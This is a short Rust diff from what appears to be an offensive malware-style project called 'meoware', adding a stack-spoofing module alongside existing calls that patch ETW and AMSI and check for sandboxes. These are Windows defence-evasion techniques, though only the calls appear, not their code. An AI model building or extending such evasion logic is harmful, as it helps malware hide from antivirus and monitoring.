@@ -1,6 +1,6 @@
 #![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]
 
-use meoware::core::{ssn_table, sandbox, etw, amsi};
+use meoware::core::{ssn_table, sandbox, etw, amsi, spoof};
 use meoware::debug;
 
 fn main() {
@@ -22,9 +22,8 @@ fn main() {
         */
 
         etw::patch_etw();
-        amsi::patch_amsi();        
-
-        /* TODO: spoof stack */
+        amsi::patch_amsi();  
+        spoof::initialize_spoof_gadgets();
 
         meoware::core::demo::demo();
     }
